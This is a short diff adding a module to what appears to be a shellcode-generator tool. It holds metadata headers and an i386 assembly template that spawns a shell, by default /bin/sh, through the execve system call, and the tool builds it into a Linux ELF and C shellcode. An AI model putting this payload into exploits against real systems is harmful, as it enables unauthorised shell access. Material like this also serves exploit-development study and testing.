@@ -1,0 +1,28 @@
+#!name##BasicSC
+#!types##worm
+#!info##Creates a small shellcode i386 32bit using the stack that runs the program. Creates an executable elf file (linux) and C file with shellcode.
+#!reqVar##shell_path##Path string. ex. /bin/sh##str
+#!setVar##shell_path##/bin/sh##str
+#!banned##module##payload##starter##shadow##junk
+#!lang##asm
+#!processWorm##BasicShell
+#!globalVar##EXTERNAL_SCRIPT##Shellcoder##Compilation using external modules.
+#!globalVar##COMPILER_NAME##MC_elf32##The name of the compiler to build the executable file.
+#!globalVar##OS_EXEC##linux##Target executable file system
+#!system_FLAG##[L]
+
+global _start
+
+section .text
+_start:
+    xor eax, eax
+    push eax
+
+{{shell_path}}
+
+    mov ebx, esp
+    push eax
+    mov edx, eax
+    mov ecx, eax
+    mov al, 11
+    int 0x80
